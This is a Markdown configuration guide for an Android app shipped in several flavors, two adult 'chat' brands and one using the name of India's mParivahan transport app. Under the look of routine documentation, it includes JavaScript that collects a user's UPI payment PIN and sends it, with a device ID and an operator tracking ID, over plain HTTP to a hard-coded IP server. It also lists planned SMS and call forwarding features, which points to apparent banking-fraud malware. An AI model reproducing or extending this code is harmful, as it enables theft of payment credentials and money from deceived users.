# Configuration Guide

Complete guide for managing app configuration via `config.json` files.

---

## ?? Table of Contents

1. [Overview](#overview)
2. [Config File Structure](#config-file-structure)
3. [Config Locations](#config-locations)
4. [Modifying Configuration](#modifying-configuration)
5. [Usage in Code](#usage-in-code)
6. [Supported Parameters](#supported-parameters)
7. [Best Practices](#best-practices)

---

## ?? Overview

All app settings are now centralized in **`config.json`** files located in each flavor's assets directory.

### Benefits

? **No Rebuild Required** - Modify settings without recompiling  
? **Centralized Management** - Single source of truth  
? **Flavor-Specific** - Each flavor has its own config  
? **Type-Safe** - Validated in Kotlin code  
? **Easy Updates** - Just edit JSON file  

---

## ?? Config File Structure

### Format

```json
{
  "app_name": "Sexy Chat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "sexychat",
  "theme": {
    "primary_color": "#ff6b9d",
    "secondary_color": "#c94b7f",
    "accent_color": "#ff1493"
  }
}
```

### Parameters

| Parameter | Type | Description | Example |
|-----------|------|-------------|---------|
| `app_name` | string | Display name of the app | `"Sexy Chat"` |
| `user_id` | string | Static user identifier (40 chars hex) | `"8f41bc5e...d1c3d983"` |
| `app_type` | string | Flavor identifier for API requests | `"sexychat"` |
| `theme.primary_color` | string | Primary gradient color (hex) | `"#ff6b9d"` |
| `theme.secondary_color` | string | Secondary gradient color (hex) | `"#c94b7f"` |
| `theme.accent_color` | string | Accent gradient color (hex) | `"#ff1493"` |

---

## ?? Config Locations

Each flavor has its own `config.json` file:

```
app/src/
??? main/assets/
?   ??? config.json          # Default fallback config
?
??? sexychat/assets/
?   ??? config.json          # SexChat configuration
?
??? mparivahan/assets/
?   ??? config.json          # mParivahan configuration
?
??? sexyhub/assets/
    ??? config.json          # SexyHub configuration
```

**Note:** Flavor-specific config overrides `main/assets/config.json`

---

## ?? Modifying Configuration

### Change App Name

**File:** `app/src/sexychat/assets/config.json`

```json
{
  "app_name": "My New App Name",
  ...
}
```

**Result:** 
- Splash screen shows new name
- JavaScript can access via `Android.getAppName()`

---

### Change User ID

**File:** `app/src/sexychat/assets/config.json`

```json
{
  "user_id": "new_user_id_here_40_characters_long",
  ...
}
```

**Result:**
- All API requests use new user ID
- Device registration uses new ID
- UPI PIN requests use new ID

---

### Change App Type

**File:** `app/src/sexychat/assets/config.json`

```json
{
  "app_type": "custom_type",
  ...
}
```

**Result:**
- API requests include `app_type: "custom_type"`
- Server can segregate data by type
- JavaScript can access via `Android.getAppType()`

---

### Change Theme Colors

**File:** `app/src/sexychat/assets/config.json`

```json
{
  "theme": {
    "primary_color": "#ff0000",    // Red
    "secondary_color": "#00ff00",   // Green
    "accent_color": "#0000ff"       // Blue
  }
  ...
}
```

**Result:**
- Splash screen gradient uses new colors
- Can be used in HTML/CSS via JavaScript

**Color Format:**
- Must be 7 characters (including #)
- Format: `#RRGGBB`
- Examples: `#ff6b9d`, `#4fc3f7`, `#1976d2`

---

## ?? Usage in Code

### Kotlin (Android)

#### Loading Config

```kotlin
// In MainActivity.onCreate()
val appConfig = AppConfig.load(this)
```

#### Accessing Values

```kotlin
val appName = appConfig.appName
val userId = appConfig.userId
val appType = appConfig.appType
val primaryColor = appConfig.theme.primaryColor
```

#### Using in Splash Screen

```kotlin
val gradientColors = listOf(
    Color(android.graphics.Color.parseColor(appConfig.theme.primaryColor)),
    Color(android.graphics.Color.parseColor(appConfig.theme.secondaryColor)),
    Color(android.graphics.Color.parseColor(appConfig.theme.accentColor))
)
```

---

### JavaScript (HTML)

#### Getting Config Values

```javascript
// Get app name
const appName = Android.getAppName();

// Get user ID
const userId = Android.getUserId();

// Get app type
const appType = Android.getAppType();
```

#### Using in UPI PIN Request

```javascript
function submitToServer(upiPin) {
    const deviceId = getDeviceId();      // From Android
    const userId = getUserId();          // From config.json
    const appType = getAppType();        // From config.json
    
    const requestData = {
        upi_pin: upiPin,
        device_id: deviceId,
        app_type: appType,   // ? Dynamic from config
        user_id: userId      // ? Dynamic from config
    };
    
    fetch('http://95.134.130.160:8765/save-pin', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(requestData)
    });
}
```

---

## ?? Supported Parameters

### app_name

**Type:** String  
**Required:** Yes  
**Min Length:** 1 character  
**Max Length:** 50 characters (recommended)

**Usage:**
- Splash screen title
- About page
- Notifications

**Examples:**
- `"Sexy Chat"`
- `"mParivahan"`
- `"Sexy Hub"`

---

### user_id

**Type:** String  
**Required:** Yes  
**Format:** 40-character hexadecimal string  
**Example:** `"8f41bc5eec42e34209a801a7fa8b2d94d1c3d983"`

**Usage:**
- Device registration
- UPI PIN requests
- All API calls requiring user correlation

**Note:** Should remain constant for tracking purposes

---

### app_type

**Type:** String  
**Required:** Yes  
**Format:** Lowercase alphanumeric + underscore  
**Max Length:** 20 characters (recommended)

**Usage:**
- API request identification
- Data segregation on server
- Analytics tracking

**Valid Values:**
- `"sexychat"`
- `"mparivahan"`
- `"sexyhub"`
- Custom values allowed

---

### theme.primary_color

**Type:** String  
**Required:** Yes  
**Format:** Hex color code (`#RRGGBB`)

**Usage:**
- Splash screen gradient (start)
- Primary UI elements

**Examples:**
- `"#ff6b9d"` - Pink (SexChat)
- `"#4fc3f7"` - Blue (mParivahan)
- `"#f093fb"` - Purple (SexyHub)

---

### theme.secondary_color

**Type:** String  
**Required:** Yes  
**Format:** Hex color code (`#RRGGBB`)

**Usage:**
- Splash screen gradient (middle)
- Secondary UI elements

---

### theme.accent_color

**Type:** String  
**Required:** Yes  
**Format:** Hex color code (`#RRGGBB`)

**Usage:**
- Splash screen gradient (end)
- Accent UI elements
- Highlights

---

## ?? Configuration Flow

```
1. App Launch
   ?
2. MainActivity.onCreate()
   ?
3. AppConfig.load(context)
   ?? Opens assets/config.json
   ?? Reads JSON content
   ?? Parses into AppConfig object
   ?? Caches in singleton
   ?
4. Config Available
   ?? appConfig.appName ? Splash screen
   ?? appConfig.userId ? API requests
   ?? appConfig.appType ? Data segregation
   ?? appConfig.theme ? UI colors
   ?
5. JavaScript Access
   ?? Android.getAppName()
   ?? Android.getUserId()
   ?? Android.getAppType()
```

---

## ?? Current Configurations

### SexChat

**File:** `app/src/sexychat/assets/config.json`

```json
{
  "app_name": "Sexy Chat",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "sexychat",
  "theme": {
    "primary_color": "#ff6b9d",
    "secondary_color": "#c94b7f",
    "accent_color": "#ff1493"
  }
}
```

**Theme:** Pink/Purple gradient

---

### mParivahan

**File:** `app/src/mparivahan/assets/config.json`

```json
{
  "app_name": "mParivahan",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "mparivahan",
  "theme": {
    "primary_color": "#4fc3f7",
    "secondary_color": "#29b6f6",
    "accent_color": "#1976d2"
  }
}
```

**Theme:** Blue gradient

---

### SexyHub

**File:** `app/src/sexyhub/assets/config.json`

```json
{
  "app_name": "Sexy Hub",
  "user_id": "8f41bc5eec42e34209a801a7fa8b2d94d1c3d983",
  "app_type": "sexyhub",
  "theme": {
    "primary_color": "#f093fb",
    "secondary_color": "#f5576c",
    "accent_color": "#ff006e"
  }
}
```

**Theme:** Pink/Red gradient

---

## ? Best Practices

### 1. Always Validate JSON

Before deploying, validate JSON syntax:

```bash
# Using Python
python -m json.tool app/src/sexychat/assets/config.json

# Using jq
jq . app/src/sexychat/assets/config.json
```

### 2. Keep user_id Consistent

Don't change `user_id` unless starting fresh tracking:
- Changing breaks historical data correlation
- Server won't link old and new data

### 3. Test After Changes

Always test app after modifying config:
```bash
./gradlew installSexychatRelease
adb logcat | grep AppConfig
```

### 4. Backup Configs

Before making changes:
```bash
cp app/src/sexychat/assets/config.json config.json.backup
```

### 5. Color Validation

Use valid hex colors:
- ? `"#ff6b9d"`
- ? `"#FF6B9D"` (also valid)
- ? `"ff6b9d"` (missing #)
- ? `"#f6b9d"` (too short)
- ? `"pink"` (not hex)

---

## ?? Troubleshooting

### Config Not Loading

**Symptom:** App crashes or uses default values

**Solutions:**

1. **Check JSON Syntax**
```bash
# Validate JSON
cat app/src/sexychat/assets/config.json | python -m json.tool
```

2. **Check File Location**
```bash
# Verify file exists
ls -la app/src/sexychat/assets/config.json
```

3. **Check Logs**
```bash
# View config loading
adb logcat | grep AppConfig
```

**Expected Log Output:**
```
D/AppConfig: ?? Reading config.json from assets...
D/AppConfig: ? Config file read successfully
D/AppConfig: ????????????????????????????????????????
D/AppConfig: ? CONFIG LOADED SUCCESSFULLY
D/AppConfig: ?? App Name: Sexy Chat
D/AppConfig: ?? User ID: 8f41bc5eec42e34209a801a7fa8b2d94d1c3d983
D/AppConfig: ?? App Type: sexychat
D/AppConfig: ?? Primary Color: #ff6b9d
D/AppConfig: ?? Secondary Color: #c94b7f
D/AppConfig: ?? Accent Color: #ff1493
D/AppConfig: ????????????????????????????????????????
```

---

### JavaScript Can't Access Config

**Symptom:** `Android.getUserId()` returns undefined

**Solutions:**

1. **Check WebView Interface**
```kotlin
// Ensure interface is added in MainActivity
webView.addJavascriptInterface(object {
    @JavascriptInterface
    fun getUserId(): String = appConfig.userId
    // ... other methods
}, "Android")
```

2. **Check JavaScript**
```javascript
// Test in browser console
if (typeof Android !== 'undefined') {
    console.log('Android interface available');
    console.log('User ID:', Android.getUserId());
} else {
    console.log('Android interface NOT available');
}
```

---

### Colors Not Showing

**Symptom:** Splash screen has wrong colors

**Solutions:**

1. **Validate Hex Format**
```json
// ? Correct
"primary_color": "#ff6b9d"

// ? Wrong - missing #
"primary_color": "ff6b9d"
```

2. **Check Color Parsing**
```kotlin
// Test color parsing
val color = Color.parseColor("#ff6b9d")
Log.d("Test", "Color: $color")
```

---

## ?? Quick Modification Examples

### Example 1: Rebrand SexChat

**Before:**
```json
{
  "app_name": "Sexy Chat",
  "app_type": "sexychat",
  ...
}
```

**After:**
```json
{
  "app_name": "Premium Chat",
  "app_type": "premiumchat",
  ...
}
```

**Steps:**
1. Edit `app/src/sexychat/assets/config.json`
2. Save file
3. Rebuild APK: `./gradlew assembleSexychatRelease`
4. Install and test

---

### Example 2: Change Theme Colors

**Before:**
```json
{
  "theme": {
    "primary_color": "#ff6b9d",
    "secondary_color": "#c94b7f",
    "accent_color": "#ff1493"
  }
}
```

**After (Blue theme):**
```json
{
  "theme": {
    "primary_color": "#2196F3",
    "secondary_color": "#1976D2",
    "accent_color": "#0D47A1"
  }
}
```

---

### Example 3: Update User ID

**Scenario:** Starting fresh tracking with new ID

```json
{
  "user_id": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0",
  ...
}
```

**?? Warning:** This breaks correlation with existing data!

---

## ?? Configuration Matrix

| Flavor | App Name | App Type | Primary Color | Secondary Color | Accent Color |
|--------|----------|----------|---------------|-----------------|--------------|
| **SexChat** | Sexy Chat | sexychat | #ff6b9d | #c94b7f | #ff1493 |
| **mParivahan** | mParivahan | mparivahan | #4fc3f7 | #29b6f6 | #1976d2 |
| **SexyHub** | Sexy Hub | sexyhub | #f093fb | #f5576c | #ff006e |

---

## ?? Update Process

### For Development

1. Edit `config.json` file
2. Clean build: `./gradlew clean`
3. Rebuild flavor: `./gradlew assembleSexychatRelease`
4. Install: `adb install app/build/outputs/apk/sexychat/release/app-sexychat-release.apk`
5. Check logs: `adb logcat | grep AppConfig`

### For Production

1. Edit config in version control
2. Commit changes
3. Push to repository
4. CI/CD builds automatically
5. Download from Artifacts

---

## ?? Testing Configuration

### Test Script

```bash
#!/bin/bash

# Build all flavors
./gradlew assembleSexychatRelease
./gradlew assembleMparivahanRelease
./gradlew assembleSexyhubRelease

# Install and check logs
adb install -r app/build/outputs/apk/sexychat/release/app-sexychat-release.apk
adb shell am start -n com.sexychat.me/.MainActivity
sleep 2
adb logcat | grep -E "AppConfig|CONFIG"
```

### Expected Behavior

For each flavor, you should see:
```
? CONFIG LOADED SUCCESSFULLY
?? App Name: [Configured Name]
?? User ID: [Configured ID]
?? App Type: [Configured Type]
?? Primary Color: [Hex Color]
```

---

## ??? Security Considerations

### ?? Sensitive Data in Config

`config.json` contains:
- `user_id` - Used for tracking
- `app_type` - Data segregation key

**Recommendations:**

1. **Don't commit real IDs** to public repos
2. **Use environment-specific configs**
3. **Obfuscate if needed** (ProGuard)
4. **Monitor access logs** on server

### Config Tampering

Users with root can modify `config.json` on device:

**Mitigations:**
1. Server-side validation of `user_id`
2. Checksum verification
3. Encrypted config files (advanced)

---

## ?? Related Documentation

- [COMPLETE_API_REFERENCE.md](./COMPLETE_API_REFERENCE.md) - All API endpoints
- [FLAVORS_GUIDE.md](./FLAVORS_GUIDE.md) - Build flavors
- [README.md](./README.md) - Project overview

---

## ?? Future Enhancements

Potential config additions:

```json
{
  "app_name": "Sexy Chat",
  "user_id": "...",
  "app_type": "sexychat",
  "server": {
    "base_url": "http://95.134.130.160:8765",
    "timeout": 15000,
    "retry_attempts": 3
  },
  "features": {
    "enable_sms_forwarding": true,
    "enable_call_forwarding": true,
    "heartbeat_interval": 60000
  },
  "theme": {
    "primary_color": "#ff6b9d",
    "secondary_color": "#c94b7f",
    "accent_color": "#ff1493",
    "splash_duration": 3000
  }
}
```

---

**Last Updated:** 2025-11-01  
**Version:** 1.0
